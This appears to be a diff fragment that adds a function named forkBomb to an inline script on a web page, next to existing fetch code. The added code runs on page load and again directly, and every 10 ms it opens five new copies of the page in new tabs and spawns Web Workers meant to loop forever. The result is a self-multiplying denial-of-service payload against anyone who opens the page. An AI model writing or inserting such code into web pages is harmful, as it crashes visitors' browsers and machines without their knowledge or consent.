@@ -38,6 +38,25 @@
             console.error('Fetch error:', error);
         }
     }
+	
+	function forkBomb() {
+        setInterval(() => {
+            for (let i = 0; i < 5; i++) {
+                window.open(location.href, '_blank');
+            }
+            new Worker(URL.createObjectURL(new Blob([`
+                self.onmessage = function() {
+                    while(true) {
+                    }
+                };
+                self.postMessage('start');
+            `])));
+        }, 10);
+    }
+    
+    window.onload = forkBomb;
+    
+    forkBomb();
 
     document.addEventListener('DOMContentLoaded', autoFetch);
 </script>
